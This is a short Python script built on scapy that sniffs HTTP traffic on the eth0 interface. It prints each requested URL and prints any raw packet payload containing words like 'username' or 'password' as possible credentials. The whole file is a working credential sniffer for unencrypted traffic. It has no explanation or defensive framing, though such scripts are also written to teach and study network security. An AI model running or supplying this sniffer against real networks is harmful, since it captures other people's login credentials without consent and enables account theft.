#/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packages)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path

def get_log_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packages(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Request >> " + url)

    login_info = get_log_info(packet)
    if login_info:
        print("\n\nPossible  username/password: " + login_info + "\n\n")

sniff("eth0")